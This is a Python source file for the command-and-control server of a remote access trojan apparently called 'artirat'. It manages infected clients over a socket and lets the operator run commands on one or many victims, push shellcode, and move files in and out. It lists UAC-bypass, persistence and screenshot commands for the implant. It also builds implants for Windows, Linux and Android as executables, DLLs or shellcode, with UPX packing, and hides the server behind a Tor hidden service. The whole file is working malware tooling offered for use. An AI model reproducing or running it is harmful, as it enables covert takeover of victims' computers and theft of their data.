#!/usr/bin/env python3
import atexit
import base64

import os
import readline
import socket
import subprocess
import sys
import threading
import time

HISTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".c2_history")

HOST = "0.0.0.0"
PORT = 1337
BUFFER_SIZE = 16384
CONTROL_PORT = 19051
SOCKS_PORT = 19050

CLIENTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clients")
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")


class ClientManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.clients: dict[int, tuple] = {}
        self.greeted: set[int] = set()
        self.next_id = 1
        self.client_hostnames: dict[int, str] = {}
        self.client_dirs: dict[int, str] = {}

    def add(self, conn, addr) -> int:
        with self.lock:
            cid = self.next_id
            self.next_id += 1
            self.clients[cid] = (conn, addr)
            print(f"\n[Client {cid} connected from {addr}]")
            return cid

    def remove(self, cid):
        with self.lock:
            self.greeted.discard(cid)
            self.client_hostnames.pop(cid, None)
            self.client_dirs.pop(cid, None)
            return self.clients.pop(cid, None)

    def list_clients(self):
        with self.lock:
            return dict(self.clients)

    def get(self, cid):
        with self.lock:
            return self.clients.get(cid)

    def mark_greeted(self, cid):
        with self.lock:
            self.greeted.add(cid)

    def has_greeted(self, cid) -> bool:
        with self.lock:
            return cid in self.greeted

    def set_hostname(self, cid: int, hostname: str):
        with self.lock:
            safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in hostname)
            if not safe:
                safe = f"client_{cid}"
            self.client_hostnames[cid] = safe
            dirname = os.path.join(CLIENTS_DIR, f"client_{cid}_{safe}")
            self.client_dirs[cid] = dirname
            os.makedirs(dirname, exist_ok=True)

    def get_client_dir(self, cid: int) -> str | None:
        with self.lock:
            return self.client_dirs.get(cid)


def accept_clients(manager: ClientManager):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = srv.accept()
        manager.add(conn, addr)


def recv_until_prompt(conn, prompt=b"client >> ", timeout=15):
    data = b""
    conn.settimeout(timeout)
    try:
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                return None
            data += chunk
            if data.endswith(prompt):
                break
        return data
    except socket.timeout:
        return None
    finally:
        conn.settimeout(None)


def send_chunked_file(conn, cmd_prefix, fname):
    basename = os.path.basename(fname)
    with open(fname, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    conn.sendall(f"{cmd_prefix}-start {basename}\n".encode())
    for i in range(0, len(b64), 16384):
        chunk = b64[i:i+16384]
        conn.sendall(f"{cmd_prefix}-chunk {chunk}\n".encode())
    conn.sendall(f"{cmd_prefix}-end\n".encode())

def parse_file_response(out):
    lines = out.split("\n")
    fname = None
    accumulated = ""
    in_file = False
    for line in lines:
        line = line.strip()
        if line.startswith("[file-start] "):
            fname = line[13:]
            accumulated = ""
            in_file = True
        elif in_file and line.startswith("[file-chunk] "):
            accumulated += line[13:]
        elif in_file and line.startswith("[file-end] "):
            in_file = False
        elif line.startswith("[file] "):
            rest = line[7:]
            sp = rest.find(" ")
            if sp > 0:
                fname = rest[:sp]
                accumulated = rest[sp + 1:]
    if fname and accumulated:
        try:
            return fname, base64.b64decode(accumulated)
        except Exception:
            pass
    return None, None

CLIENT_COMMANDS = [
    "help", "/h", "/?",
    "cd",
    "screenshot",
    "upload",
    "download",
    "uac",
    "uac2",
    "persist",
    "check_elevated",
    "self_uac",
    "portscan",
    "exit", "quit",
    "background",
]

FILE_CMDS = {"download"}


def _interactive_completer(text, state):
    line = readline.get_line_buffer()
    parts = line.split()
    cmd = parts[0].strip() if parts else ""
    if cmd in FILE_CMDS:
        dirname = os.path.dirname(text) or "."
        basename = os.path.basename(text)
        try:
            entries = sorted(os.listdir(dirname))
        except OSError:
            entries = []
        matches = []
        for e in entries:
            if not e.startswith(basename):
                continue
            full = os.path.join(dirname, e)
            suffix = "/" if os.path.isdir(full) else " "
            display = e if dirname == "." else os.path.join(dirname, e)
            matches.append(display + suffix)
        if state < len(matches):
            return matches[state]
        return None
    if not parts or (len(parts) == 1 and not line.endswith(" ")):
        matches = [c for c in CLIENT_COMMANDS if c.startswith(text)]
        if state < len(matches):
            return matches[state]
    return None


def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initial=True):
    old_completer = readline.get_completer()
    old_delims = readline.get_completer_delims()
    readline.set_completer(_interactive_completer)
    readline.set_completer_delims(" \t\n")
    readline.parse_and_bind("tab: complete")
    prompt = ">> "
    if read_initial:
        try:
            initial = recv_until_prompt(conn, prompt.encode(), timeout=30)
        except KeyboardInterrupt:
            print()
            return _restore_completer("background", old_completer, old_delims)
        if initial is None:
            return _restore_completer("exit", old_completer, old_delims)
        init_text = initial.decode(errors="ignore")
        hostname_full = init_text.split(">>")[0].strip()
        if "@" in hostname_full:
            hostname = hostname_full.split("@", 1)[1].split("[")[0].strip()
        else:
            hostname = hostname_full.split("[")[0].strip()
        if not hostname:
            hostname = hostname_full
        manager.set_hostname(cid, hostname)
        print(init_text, end="", flush=True)
    while True:
        try:
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print()
            return _restore_completer("background", old_completer, old_delims)
        if not line:
            continue
        line = line.strip()
        if line in ("exit", "quit", "/quit"):
            try:
                conn.sendall((line + "\n").encode())
            except Exception:
                pass
            time.sleep(0.3)
            return _restore_completer("exit", old_completer, old_delims)
        if line == "background":
            return _restore_completer("background", old_completer, old_delims)
        try:
            if line.startswith("download "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                send_chunked_file(conn, "download", fname)
            elif line.startswith("shellcode "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    print("Usage: shellcode <filepath>")
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                with open(fname, "rb") as f:
                    data = f.read()
                b64 = base64.b64encode(data).decode()
                cmd = f"shellcode {b64}\n"
                conn.sendall(cmd.encode())
            else:
                conn.sendall((line + "\n").encode())
            conn.settimeout(15)
            try:
                response = recv_until_prompt(conn, prompt.encode())
            except KeyboardInterrupt:
                print()
                return _restore_completer("background", old_completer, old_delims)
            finally:
                conn.settimeout(None)
            if response is None:
                print("[Connection lost]")
                return _restore_completer("exit", old_completer, old_delims)
            out = response.decode(errors="ignore")
            if out.endswith(prompt):
                out = out[:-len(prompt)]
            if "\n" in out:
                last_nl = out.rfind("\n")
                trail = out[last_nl+1:]
                if "@" in trail and "[" in trail and trail.strip().endswith("]"):
                    out = out[:last_nl] + "\n"
            out_clean = out.rstrip("\n")
            fname, fdata = parse_file_response(out_clean)
            if fname and fdata:
                client_dir = manager.get_client_dir(cid)
                if client_dir:
                    save_path = os.path.join(client_dir, fname)
                    with open(save_path, "wb") as f:
                        f.write(fdata)
                    print(f"[Saved: {save_path} ({len(fdata)} bytes)]")
                else:
                    with open(fname, "wb") as f:
                        f.write(fdata)
                    print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
            print(out, end="", flush=True)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            print("\n[Connection lost]")
            return _restore_completer("exit", old_completer, old_delims)
        except Exception as e:
            print(f"Error: {e}")


def _restore_completer(result, old_completer, old_delims):
    if old_completer:
        readline.set_completer(old_completer)
    if old_delims:
        readline.set_completer_delims(old_delims)
    return result


def multi_run(manager: ClientManager, cmdline: str, timeout=15):
    clients = manager.list_clients()
    if not clients:
        print("No clients connected")
        return

    if cmdline.startswith("download "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        basename = os.path.basename(fname)
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        chunks = [b64[i:i+16384] for i in range(0, len(b64), 16384)]
        cmdline = f"download-start {basename}\n" + \
                  "\n".join(f"download-chunk {c}" for c in chunks) + \
                  f"\ndownload-end"
    elif cmdline.startswith("shellcode "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        cmdline = f"shellcode {b64}"

    print(f"[*] multi_run on {len(clients)} client(s): {cmdline}")
    results = {}
    threads = []
    lock = threading.Lock()

    def run(cid, conn):
        try:
            conn.settimeout(timeout)
            conn.sendall((cmdline + "\n").encode())
            response = b""
            while True:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                response += chunk
                if response.endswith(b">> "):
                    break
            conn.settimeout(None)
            with lock:
                results[cid] = response
        except socket.timeout:
            conn.settimeout(None)
            with lock:
                results[cid] = b"(command timed out)\n"
        except Exception as e:
            conn.settimeout(None)
            with lock:
                results[cid] = f"(error: {e})\n".encode()

    for cid, (conn, _) in clients.items():
        t = threading.Thread(target=run, args=(cid, conn))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for cid in sorted(results.keys()):
        data = results[cid]
        print(f"\n--- Client {cid} ---")
        out = data.decode(errors="ignore") if isinstance(data, bytes) else str(data)
        prompt = ">> "
        if out.endswith(prompt):
            out = out[:-len(prompt)]
        if "\n" in out:
            last_nl = out.rfind("\n")
            trail = out[last_nl+1:]
            if "@" in trail and "[" in trail and trail.strip().endswith("]"):
                out = out[:last_nl] + "\n"
        fname, fdata = parse_file_response(out)
        if fname and fdata:
            client_dir = manager.get_client_dir(cid)
            if client_dir:
                save_path = os.path.join(client_dir, f"multi_{fname}")
            else:
                save_path = f"multi_{cid}_{fname}"
            with open(save_path, "wb") as f:
                f.write(fdata)
            print(f"  [Saved: {save_path} ({len(fdata)} bytes)]")
        print(out, end="")


ALL_BUILD_TARGETS = [
    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
    "dll-windows", "dll-linux",
    "windows-shellcode", "windows32-shellcode", "linux-shellcode", "linux32-shellcode",
]
EXE_BUILD_TARGETS = [
    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
]


def _stream_cargo(cmd, cwd, env, verbose=False):
    process = None
    try:
        if verbose:
            process = subprocess.Popen(
                cmd, cwd=cwd, env=env,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            for line in process.stdout:
                print(line, end="", flush=True)
            process.wait()
            return process.returncode
        process = subprocess.Popen(
            cmd, cwd=cwd, env=env,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        process.wait()
        return process.returncode
    except KeyboardInterrupt:
        print("\n[!] Build aborted")
        if process:
            process.terminate()
            process.wait()
        return -1


def build_client(target: str, verbose=False, static=False, upx=False):
    targets = {
        "windows": "x86_64-pc-windows-gnu",
        "linux": "x86_64-unknown-linux-gnu",
        "linux-musl": "x86_64-unknown-linux-musl",
        "linux32": "i686-unknown-linux-gnu",
        "android": "aarch64-linux-android",
        "windows32": "i686-pc-windows-gnu",
        "dll-windows": "x86_64-pc-windows-gnu",
        "dll-linux": "x86_64-unknown-linux-gnu",
        "windows-shellcode": "x86_64-pc-windows-gnu",
        "windows32-shellcode": "i686-pc-windows-gnu",
        "linux-shellcode": "x86_64-unknown-linux-musl",
        "linux32-shellcode": "i686-unknown-linux-gnu",
    }
    t = targets.get(target, target)
    is_shellcode = target.endswith("-shellcode")
    is_dll = target.startswith("dll-")
    kind = "SHELLCODE" if is_shellcode else ("DLL/SO" if is_dll else "EXE")
    print(f"[*] Building {kind} for {t} (this may take a while)...")
    env = os.environ.copy()
    if target == "android" or t == "aarch64-linux-android":
        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"

    rustflags = env.get("RUSTFLAGS", "")
    is_windows = "windows" in target
    if is_dll:
        cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
    else:
        if static:
            rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
        cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]
    if rustflags:
        env["RUSTFLAGS"] = rustflags

    rc = _stream_cargo(cmd, os.path.join(".", "artirat-client"), env, verbose)
    if rc != 0:
        print(f"[-] Build failed for {t} (exit code {rc})")
        return False

    if is_shellcode:
        src_name = "artirat_client" + (".exe" if "windows" in target else "")
        src_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
        out_name = f"artirat_client_{target}.bin"
        out_path = os.path.join(".", out_name)
        objcopy = "objcopy"
        if "windows" in target:
            objcopy = "x86_64-w64-mingw32-objcopy" if "32" not in target else "i686-w64-mingw32-objcopy"
        try:
            subprocess.run(
                [objcopy, "-O", "binary", src_path, out_path],
                capture_output=True, text=True, check=True
            )
            size = os.path.getsize(out_path)
            print(f"[+] Shellcode written to {out_name} ({size} bytes)")
        except FileNotFoundError:
            print(f"[-] {objcopy} not found — raw binary at {src_path} (not converted)")
            print(f"    Manually run: objcopy -O binary '{src_path}' '{out_name}'")
        except subprocess.CalledProcessError as e:
            print(f"[-] objcopy failed: {e.stderr or e}")
    else:
        print(f"[+] Build succeeded for {t}")
        if upx and not is_shellcode:
            src_name = "artirat_client" + (".exe" if "windows" in target else "")
            if is_dll:
                src_name = "libartirat_client" + (".dll" if "windows" in target else ".so")
            bin_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
            if os.path.exists(bin_path):
                orig_size = os.path.getsize(bin_path)
                print(f"[*] Compressing with UPX... (original: {orig_size} bytes)")
                result = subprocess.run(
                    ["upx", "--force", bin_path],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    new_size = os.path.getsize(bin_path)
                    ratio = (1 - new_size / orig_size) * 100
                    print(f"[+] UPX compression complete: {new_size} bytes ({ratio:.1f}% reduction)")
                else:
                    print(f"[-] UPX failed: {result.stderr.strip()}")
            else:
                print(f"[-] UPX: binary not found at {bin_path}")
    return True


def setup_readline(completer):
    readline.set_completer(completer)
    readline.set_completer_delims(" \t\n")
    if hasattr(readline, "read_history_file"):
        try:
            readline.read_history_file(HISTFILE)
        except FileNotFoundError:
            pass
    atexit.register(lambda: readline.write_history_file(HISTFILE))


def c2_completer(text, state, manager=None):
    if manager is None:
        return None
    CMD2 = {"select", "build"}
    CMD1 = {"list", "exit"}
    ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
    line = readline.get_line_buffer()
    parts = line.split()
    if not parts or (len(parts) == 1 and not line.endswith(" ")):
        prefix = parts[0] if parts else ""
        candidates = [c for c in ALL_CMDS if c.startswith(prefix)]
        return candidates[state] if state < len(candidates) else None
    cmd = parts[0]
    if line.endswith(" "):
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = ["all"] + ALL_BUILD_TARGETS
            return candidates[state] if state < len(candidates) else None
        return None
    if cmd in CMD2 and len(parts) == 2:
        arg = parts[1]
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids if str(i).startswith(arg)]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = [t for t in (["all"] + ALL_BUILD_TARGETS) if t.startswith(arg)]
            return candidates[state] if state < len(candidates) else None
    return None


def c2_menu(manager: ClientManager):
    def comp(text, state):
        return c2_completer(text, state, manager)
    readline.parse_and_bind("tab: complete")
    setup_readline(comp)
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0]
        if cmd == "list":
            clients = manager.list_clients()
            if not clients:
                print("No clients connected")
            else:
                for cid, (_, addr) in clients.items():
                    print(f"Client {cid} - {addr}")
        elif cmd == "select":
            if len(parts) < 2:
                print("Usage: select <id>")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print("Invalid id")
                continue
            client = manager.get(cid)
            if client is None:
                print(f"Client {cid} not found")
                continue
            conn, addr = client
            first_select = not manager.has_greeted(cid)
            if first_select:
                manager.mark_greeted(cid)
            print(f"[Selected client {cid}, entering interactive session]")
            print("[Type exit/quit to return to menu]")
            try:
                result = interactive_session(manager, conn, addr, cid, read_initial=first_select)
            except (EOFError, KeyboardInterrupt):
                print()
                result = "background"
            except Exception as e:
                print(f"Session error: {e}")
                result = "exit"
            if result == "exit":
                manager.remove(cid)
                try:
                    conn.close()
                except Exception:
                    pass
                print(f"[Session with client {cid} ended]")
            else:
                print(f"[Backgrounded session with client {cid}]")
        elif cmd == "build":
            if len(parts) < 2:
                print("Usage: build <target> [--verbose] [--static] [--upx]")
                print("       build all [--verbose] [--static] [--upx]")
                print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                continue
            verbose = "--verbose" in parts
            static = "--static" in parts
            upx = "--upx" in parts
            target_arg = parts[1]
            if target_arg == "all":
                targets = EXE_BUILD_TARGETS
                for t in targets:
                    print(f"\n{'='*60}")
                    build_client(t, verbose=verbose, static=static, upx=upx)
                print(f"\n{'='*60}")
                print("[+] All builds finished")
            else:
                build_client(target_arg, verbose=verbose, static=static, upx=upx)
        elif cmd == "multi_run":
            if len(parts) < 2:
                print("Usage: multi_run <command>")
                continue
            multi_run(manager, line[len(cmd):].strip())
        elif cmd == "exit":
            break
        else:
            print("Commands: list, select <id>, multi_run <cmd>, build <target>, exit")


def connect_tor():
    print("[*] Connecting to Tor on localhost:9051...")
    from stem.control import Controller
    for _ in range(30):
        try:
            controller = Controller.from_port(port=9051)
            controller.authenticate()
            print("[+] Connected and authenticated to Tor")
            return controller
        except Exception:
            time.sleep(1)
            continue
    raise RuntimeError("Could not connect to Tor on localhost:9051")


def create_hidden_service(controller):
    HS_DIR = os.path.join(SERVER_CONFIG_DIR, "hidden_service")
    os.makedirs(HS_DIR, exist_ok=True)
    os.chmod(HS_DIR, 0o700)

    print("[*] Setting up hidden service...")
    controller.set_options([
        ("HiddenServiceDir", HS_DIR),
        ("HiddenServicePort", f"{PORT} {HOST}:{PORT}"),
    ])

    hostname_file = os.path.join(HS_DIR, "hostname")
    for _ in range(60):
        if os.path.exists(hostname_file):
            with open(hostname_file) as f:
                hostname = f.read().strip()
            print(f"[+] Hidden service ready: {hostname}")
            return hostname
        time.sleep(1)

    raise RuntimeError("Timed out waiting for hidden service hostname")


def write_hostname(hostname: str):
    os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
    content = hostname
    with open(CLIENT_HOSTNAME_PATH, "w") as f:
        f.write(content)
    print(f"[+] Wrote hostname to {CLIENT_HOSTNAME_PATH}")


def run_c2_server():
    import shutil
    try:
        shutil.copyfile("torrc","/etc/tor/torrc")
    
        os.system("systemctl restart tor@default")
    except:
        pass
    manager = ClientManager()
    threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
    time.sleep(0.3)
    controller = connect_tor()
    try:
        file = open('../../usr/var/lib/tor/artirat/hostname',"r")
        hostname = file.read()
        write_hostname(hostname)
    except:
        os.system(" cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
        print("[*] Copied Hidden Service Hostname")
        
    print()
    c2_menu(manager)


if __name__ == "__main__":
    run_c2_server()
